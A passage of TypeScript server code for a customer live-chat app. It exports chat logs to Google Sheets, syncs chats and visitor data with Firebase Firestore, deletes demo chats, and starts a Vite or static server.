          'Customer',
          chat.lastMessage || 'New Lead Started',
          chat.satisfactionRating ? `${chat.satisfactionRating}/5` : 'N/A',
        ]);
      } else {
        chatMsgs.forEach((msg) => {
          rowsToAppend.push([
            msg.timestamp || new Date().toLocaleTimeString(),
            chat.id,
            chat.customer.name,
            chat.customer.email,
            chat.department,
            chat.status,
            `${msg.senderName} (${msg.senderRole}${msg.isInternalNote ? ' - Internal Note' : ''})`,
            msg.content,
            chat.satisfactionRating ? `${chat.satisfactionRating}/5` : 'N/A',
          ]);
        });
      }
    });

    // 3. Append Rows to Google Sheet
    if (rowsToAppend.length > 0) {
      const appendRes = await fetch(
        `https://sheets.googleapis.com/v4/spreadsheets/${targetSpreadsheetId}/values/Live Chat Leads & Logs!A1:append?valueInputOption=USER_ENTERED`,
        {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${accessToken}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ values: rowsToAppend }),
        }
      );

      if (!appendRes.ok) {
        const errJson = await appendRes.json();
        return res.status(appendRes.status).json({ error: errJson.error?.message || 'Failed to append rows to Google Sheet' });
      }
    }

    res.json({
      success: true,
      spreadsheetId: targetSpreadsheetId,
      spreadsheetUrl,
      rowsExported: rowsToAppend.length,
    });
  } catch (err: any) {
    console.error('Google Sheets Sync Error:', err);
    res.status(500).json({ error: err.message || 'Internal server error while syncing to Google Sheets' });
  }
});

async function initFirestoreInBackground() {
  // Initialize Firestore Data & Realtime Listeners in the background
  try {
    console.log('🔥 Initializing Firebase Firestore connection...');
    const loadedData = await loadFirestoreData();
    if (loadedData && loadedData.chats && loadedData.chats.length > 0) {
      chats = loadedData.chats;
      messages = loadedData.messages || {};
      if (loadedData.visitorLogs && Array.isArray(loadedData.visitorLogs) && loadedData.visitorLogs.length > 0) {
        visitorLogs = loadedData.visitorLogs;
        console.log(`✅ Restored ${visitorLogs.length} historical visitor logs from Firebase Firestore!`);
      }
      if (loadedData.widgetConfig) widgetConfig = { ...widgetConfig, ...loadedData.widgetConfig };
      widgetConfig.websiteUrl = 'https://live-chat-swart-nine.vercel.app/';
      await syncWidgetConfigToFirestore(widgetConfig);
      console.log(`✅ Loaded ${chats.length} active chats & synced websiteUrl to Firebase Firestore!`);
    } else {
      console.log('🔥 Initializing Firestore collections with seed data...');
      for (const chat of chats) {
        await syncChatToFirestore(chat);
      }
      for (const [cId, msgList] of Object.entries(messages)) {
        for (const msg of msgList) {
          await syncMessageToFirestore(msg);
        }
      }
      await syncWidgetConfigToFirestore(widgetConfig);
      console.log('✅ Initial Firestore seed completed!');
    }

    // Filter out and remove demo chats (Sabiha, Hasan Mahmud)
    const demoChatIdsToDelete: string[] = [];
    chats = chats.filter((c) => {
      const isDemo =
        c.customer?.name?.includes('সাবিহা') ||
        c.customer?.name?.includes('Sabiha') ||
        c.customer?.name?.includes('হাসান') ||
        c.customer?.name?.includes('Hasan') ||
        c.id === 'CHAT-01712345678-103.205.132.10' ||
        c.id === 'CHAT-01819876543-103.112.50.46';
      if (isDemo) {
        demoChatIdsToDelete.push(c.id);
        return false;
      }
      return true;
    });

    for (const id of demoChatIdsToDelete) {
      delete messages[id];
      await deleteChatFromFirestore(id);
      console.log(`🗑️ Deleted demo chat ${id} from Firestore!`);
    }

    // Start Realtime Firestore Listeners
    setupFirestoreRealtimeListeners(
      (updatedChats) => {
        if (updatedChats) {
          chats = updatedChats;
          broadcast({ type: 'full_reset' });
        }
      },
      (updatedMessages) => {
        if (updatedMessages) {
          messages = updatedMessages;
          broadcast({ type: 'full_reset' });
        }
      },
      undefined,
      (updatedBlocked) => {
        if (updatedBlocked) {
          blockedUsers = updatedBlocked;
          broadcast({ type: 'full_reset' });
        }
      },
      (updatedVisitors) => {
        if (updatedVisitors) {
          liveVisitors = updatedVisitors.filter(
            (v: any) =>
              !v.id?.includes('seed') &&
              !v.id?.includes('demo') &&
              !v.name?.includes('#') &&
              !v.name?.includes('Demo')
          );
          broadcast({ type: 'visitors_updated', visitors: liveVisitors });
        }
      }
    );
  } catch (err) {
    console.error('⚠️ Firebase Firestore init error:', err);
  }
}

// Vite Middleware for Dev / Static serving for Production
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*all', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  httpServer.listen(PORT, '0.0.0.0', () => {
    console.log(`Customer Live Chat Server running at http://0.0.0.0:${PORT}`);
    // Boot Firestore sync non-blockingly after server is accepting connections
    initFirestoreInBackground().catch((e) => console.error('Firestore init error:', e));
  });
}

startServer().catch(console.error);
